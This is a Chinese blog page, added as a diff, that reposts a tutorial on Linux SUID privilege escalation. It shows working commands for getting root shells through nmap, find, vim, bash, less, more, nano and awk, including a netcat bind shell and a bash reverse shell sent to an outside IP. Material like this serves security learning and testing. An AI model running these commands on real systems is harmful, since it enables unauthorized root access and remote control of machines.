@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="SUID提权转载自链接：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;272617.html 0x00 SUID概述SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUID提权">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="SUID提权转载自链接：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;272617.html 0x00 SUID概述SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;1.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;3.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;4.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;5.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;6.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;7.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;8.jpg">
+<meta property="og:updated_time" content="2021-07-27T08:37:40.696Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;27&#x2F;SUID%E6%8F%90%E6%9D%83&#x2F;1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2021/07/27/SUID提权/"/>
+
+
+
+
+
+  <title>SUID提权 | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2021/07/27/SUID%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SUID提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-27T16:15:10+08:00">
+                2021-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>转载自链接：<a href="https://www.freebuf.com/articles/web/272617.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/272617.html</a></p>
+<h2 id="0x00-SUID概述"><a href="#0x00-SUID概述" class="headerlink" title="0x00 SUID概述"></a>0x00 SUID概述</h2><p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，<strong>进程的属主不是发起者，而是程序文件所属的属主</strong>。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p>
+<p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效。</p>
+<blockquote>
+<p>通俗的来讲,假设我们现在有一个可执行文件<code>ls</code>,其属主为root,当我们通过非root用户登录时,如果<code>ls</code>设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限. </p>
+</blockquote>
+<h2 id="0x01-SUID设置"><a href="#0x01-SUID设置" class="headerlink" title="0x01 SUID设置"></a>0x01 SUID设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   设置SUID位</span><br><span class="line">chmod u<span class="_">-s</span> filename   去掉SUID设置</span><br></pre></td></tr></table></figure>
+
+<p>举一个设置SUID实例，通过 <code>ls -al</code>查看文件权限：</p>
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/1.jpg" alt></p>
+<p>执行 <code>chmod u+s binexec</code> 设置SUID位：</p>
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/3.jpg" alt></p>
+<p>可以看到<code>binexec</code>文件的权限描述符由<code>-rwxr-xr-x</code>变为<code>-rwsr-xr-x</code>，这代表该文件已经获得了suid权限</p>
+<h2 id="0x02-SUID提权"><a href="#0x02-SUID提权" class="headerlink" title="0x02 SUID提权"></a>0x02 SUID提权</h2><p>即“<strong>通过root设置的具有SUID权限的二进制可执行文件提权</strong>”， 现在已知的具有SUID权限的二进制可执行文件大体有如下这些 ：</p>
+<ul>
+<li>nmap </li>
+<li>vim </li>
+<li>find </li>
+<li>bash </li>
+<li>more </li>
+<li>less </li>
+<li>nano </li>
+<li>cp </li>
+<li>awk </li>
+</ul>
+<p>通过以下命令可以<strong>找到正在系统上运行的所有SUID可执行文件</strong>。准确的说，这个命令将从/目录中查找<strong>具有SUID权限位且属主为root</strong>的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/4.jpg" alt></p>
+<p>以上所有的二进制文件都将以root权限运行 我们随便找一个：</p>
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/5.jpg" alt></p>
+<p> 可以看到其设置了suid权限且属主为root，<strong>符合我们的利用条件</strong>。</p>
+<h2 id="0x03-具体操作"><a href="#0x03-具体操作" class="headerlink" title="0x03 具体操作"></a>0x03 具体操作</h2><h3 id="00-nmap"><a href="#00-nmap" class="headerlink" title="00 nmap"></a>00 nmap</h3><blockquote>
+<p> 适用版本:nmap2.02至5.21 </p>
+</blockquote>
+<p>在早期nmap版本中,带有交互模式,因而允许用户执行shell命令，使用如下命令进入nmap交互模式:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<p>在nmap交互模式中 通过如下命令提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h3 id="01-find"><a href="#01-find" class="headerlink" title="01 find"></a>01 find</h3><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch anyfile <span class="comment">#必须要有这个文件</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/6.jpg" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入shell</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> <span class="string">'/bin/sh'</span> \;</span><br><span class="line">sh-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell。广播shell的操作:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find user -<span class="built_in">exec</span> nc -lvp 4444 -e <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上执行:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell的操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1'</span> \;</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上执行:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<h3 id="02-Vim"><a href="#02-Vim" class="headerlink" title="02 Vim"></a>02 Vim</h3><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny  /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>通过vim进入shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment">#vim命令</span></span><br><span class="line">:<span class="built_in">set</span> shell = <span class="string">'/bin/sh'</span></span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="03-Bash"><a href="#03-Bash" class="headerlink" title="03 Bash"></a>03 Bash</h3><p>以下命令将以root身份打开一个bash shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure>
+
+<h3 id="04-less"><a href="#04-less" class="headerlink" title="04 less"></a>04 less</h3><p>less命令也可以进入shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="05-more"><a href="#05-more" class="headerlink" title="05 more"></a>05 more</h3><p>more命令进入shell和less相同：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用<code>!</code>命令进入shell。</p>
+<h3 id="06-nano"><a href="#06-nano" class="headerlink" title="06 nano"></a>06 nano</h3><p>nano也算是比较上古的文本编辑器了。nano进入shell的方法为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano <span class="comment">#进入nano编辑器</span></span><br><span class="line">Ctrl + R</span><br><span class="line">Ctrl + X </span><br><span class="line"><span class="comment">#即可输入命令</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/7.jpg" alt></p>
+<h3 id="07-cp"><a href="#07-cp" class="headerlink" title="07 cp"></a>07 cp</h3><p>使用cp 命令覆盖原来的<code>/etc/passwd</code>文件</p>
+<h3 id="08-awk"><a href="#08-awk" class="headerlink" title="08 awk"></a>08 awk</h3><p>awk命令进入shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/8.jpg" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/07/27/Write-Shell/" rel="next" title="Write-Shell">
+                <i class="fa fa-chevron-left"></i> Write-Shell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUID提权"><span class="nav-number">1.</span> <span class="nav-text">SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-SUID概述"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 SUID概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SUID设置"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 SUID设置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SUID提权"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 SUID提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-具体操作"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 具体操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-nmap"><span class="nav-number">1.4.1.</span> <span class="nav-text">00 nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-find"><span class="nav-number">1.4.2.</span> <span class="nav-text">01 find</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02-Vim"><span class="nav-number">1.4.3.</span> <span class="nav-text">02 Vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#03-Bash"><span class="nav-number">1.4.4.</span> <span class="nav-text">03 Bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#04-less"><span class="nav-number">1.4.5.</span> <span class="nav-text">04 less</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#05-more"><span class="nav-number">1.4.6.</span> <span class="nav-text">05 more</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#06-nano"><span class="nav-number">1.4.7.</span> <span class="nav-text">06 nano</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#07-cp"><span class="nav-number">1.4.8.</span> <span class="nav-text">07 cp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#08-awk"><span class="nav-number">1.4.9.</span> <span class="nav-text">08 awk</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
